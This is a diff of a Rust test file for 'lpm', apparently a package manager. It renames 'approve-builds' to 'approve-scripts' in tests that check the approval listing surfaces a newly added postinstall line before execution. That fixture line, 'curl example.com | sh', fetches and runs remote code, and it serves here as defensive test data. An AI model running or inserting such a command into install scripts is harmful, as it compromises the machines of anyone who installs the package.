@@ -5,25 +5,25 @@
 //! 1. **Script-hash drift surfaces the exact added line** — updating
 //!    a package whose postinstall added `curl example.com | sh`
 //!    between approved v1 and candidate v2 must surface that exact
-//!    line in `lpm approve-builds` output **before any execution**.
+//!    line in `lpm approve-scripts` output **before any execution**.
 //!    The unified-diff section (rendered via `diffy`) is the wire
 //!    contract.
 //!
 //! 2. **Behavioral-tag delta surfaces the gained tags** — when v2
 //!    adds `network` and `eval` to a package that previously had only
-//!    `crypto`, the install-time and approve-builds outputs must show
+//!    `crypto`, the install-time and approve-scripts outputs must show
 //!    `+ network` and `+ eval`. The terse hint, the human card, and
 //!    the JSON enrichment all surface this.
 //!
-//! ## Why subprocess + the approve-builds path
+//! ## Why subprocess + the approve-scripts path
 //!
 //! The C2 install render path can't be exercised end-to-end without
 //! a real `lpm install` run (which requires lockfile-validated
 //! integrity against a registry — the P6 harness comment explains
 //! the same blocker). The diff-rendering CONTRACT is identical
-//! between the install pre-autobuild card and the approve-builds
+//! between the install pre-autobuild card and the approve-scripts
 //! TUI card (both call `render_preflight_card`); the C5 fixture
-//! therefore exercises the contract through `lpm approve-builds
+//! therefore exercises the contract through `lpm approve-scripts
 //! --list` (human + JSON), which lands the same render at the
 //! exact byte level the install path would.
 //!
@@ -112,7 +112,7 @@ fn seed_package(home: &Path, name: &str, version: &str, postinstall: &str) -> Pa
 }
 
 /// Synthesize a `<project>/.lpm/build-state.json` with one blocked
-/// entry — the candidate version we want `lpm approve-builds` to
+/// entry — the candidate version we want `lpm approve-scripts` to
 /// surface a diff for. The fields are the post-Phase-46-P1+P7 shape:
 ///
 /// - `script_hash` distinguishes drift from no-change (the diff core
@@ -221,23 +221,23 @@ impl Fixture {
     }
 }
 
-// ── Ship criterion 1: exact added line surfaces in approve-builds ──
+// ── Ship criterion 1: exact added line surfaces in approve-scripts ──
 
 /// §11 P7 ship criterion 1 — scenario A.
 ///
 /// Updating a package whose postinstall added `curl example.com | sh`
 /// between approved v1 and candidate v2 surfaces the **exact added
-/// line** in `lpm approve-builds --list` output. The unified-diff
+/// line** in `lpm approve-scripts --list` output. The unified-diff
 /// section is rendered via `diffy` and the `+curl example.com | sh`
 /// line must appear verbatim — this is the literal P7 contract.
 ///
-/// This test exercises the approve-builds path because we can't drive
+/// This test exercises the approve-scripts path because we can't drive
 /// the real install path in a synthetic harness (P6 fixture
 /// commentary). The diff renderer is shared between install's
-/// pre-autobuild card and the approve-builds card, so a passing
+/// pre-autobuild card and the approve-scripts card, so a passing
 /// assertion here proves both sites' rendering contract.
 #[test]
-fn p7_chunk5_script_hash_drift_surfaces_added_curl_pipe_in_approve_builds_list() {
+fn p7_chunk5_script_hash_drift_surfaces_added_curl_pipe_in_approve_scripts_list() {
     let fx = Fixture::new();
 
     // Seed both versions in the store. Body of v1: a benign `echo`.
@@ -276,16 +276,16 @@ fn p7_chunk5_script_hash_drift_surfaces_added_curl_pipe_in_approve_builds_list()
         None,
     );
 
-    // Run `lpm approve-builds --list` — non-interactive, prints the
+    // Run `lpm approve-scripts --list` — non-interactive, prints the
     // package card AND (with C3's wiring) the version-diff card per
     // entry that has a prior binding.
-    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-builds", "--list"]);
+    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
     let stdout = strip_ansi(&stdout);
     let stderr = strip_ansi(&stderr);
 
     assert!(
         status.success(),
-        "approve-builds --list must exit 0. stdout={stdout}\nstderr={stderr}"
+        "approve-scripts --list must exit 0. stdout={stdout}\nstderr={stderr}"
     );
 
     // The diff card prints to stdout (TUI is stdout-driven). Assert:
@@ -350,14 +350,14 @@ fn p7_chunk5_script_hash_drift_emits_structured_version_diff_in_json() {
     let (status, stdout, _stderr) = run_lpm(
         &fx.project,
         &fx.home,
-        &["--json", "approve-builds", "--list"],
+        &["--json", "approve-scripts", "--list"],
     );
     let stdout = strip_ansi(&stdout);
     assert!(status.success());
 
     let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap_or_else(|e| {
         panic!(
-            "approve-builds --list --json stdout must be parseable JSON. \
+            "approve-scripts --list --json stdout must be parseable JSON. \
              Parse error: {e}\nStdout:\n{stdout}"
         )
     });
@@ -428,12 +428,12 @@ fn p7_chunk5_behavioral_tag_drift_surfaces_gained_network_and_eval_in_card() {
         Some("sha256-creep-tags-v2"),
     );
 
-    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-builds", "--list"]);
+    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
     let stdout = strip_ansi(&stdout);
     let stderr = strip_ansi(&stderr);
     assert!(
         status.success(),
-        "approve-builds --list must exit 0. stdout={stdout}\nstderr={stderr}"
+        "approve-scripts --list must exit 0. stdout={stdout}\nstderr={stderr}"
     );
 
     // Header names candidate + prior.
@@ -495,7 +495,7 @@ fn p7_chunk5_behavioral_tag_drift_emits_gained_arrays_in_json() {
     let (status, stdout, _stderr) = run_lpm(
         &fx.project,
         &fx.home,
-        &["--json", "approve-builds", "--list"],
+        &["--json", "approve-scripts", "--list"],
     );
     let stdout = strip_ansi(&stdout);
     assert!(status.success());
@@ -548,7 +548,7 @@ fn p7_chunk5_list_json_stays_parseable_with_version_diff_enrichment() {
     let (status, stdout, _stderr) = run_lpm(
         &fx.project,
         &fx.home,
-        &["--json", "approve-builds", "--list"],
+        &["--json", "approve-scripts", "--list"],
     );
     let stdout = strip_ansi(&stdout);
     assert!(status.success());
@@ -600,7 +600,7 @@ fn p7_chunk5_first_time_review_emits_null_version_diff_and_no_card() {
 
     // Human path: `--list` MUST NOT print a "changes since v..."
     // header (no prior to compare against).
-    let (status, stdout, _stderr) = run_lpm(&fx.project, &fx.home, &["approve-builds", "--list"]);
+    let (status, stdout, _stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
     let stdout = strip_ansi(&stdout);
     assert!(status.success());
     assert!(
@@ -612,7 +612,7 @@ fn p7_chunk5_first_time_review_emits_null_version_diff_and_no_card() {
     let (_, json_stdout, _) = run_lpm(
         &fx.project,
         &fx.home,
-        &["--json", "approve-builds", "--list"],
+        &["--json", "approve-scripts", "--list"],
     );
     let json_stdout = strip_ansi(&json_stdout);
     let parsed: serde_json::Value = serde_json::from_str(json_stdout.trim())
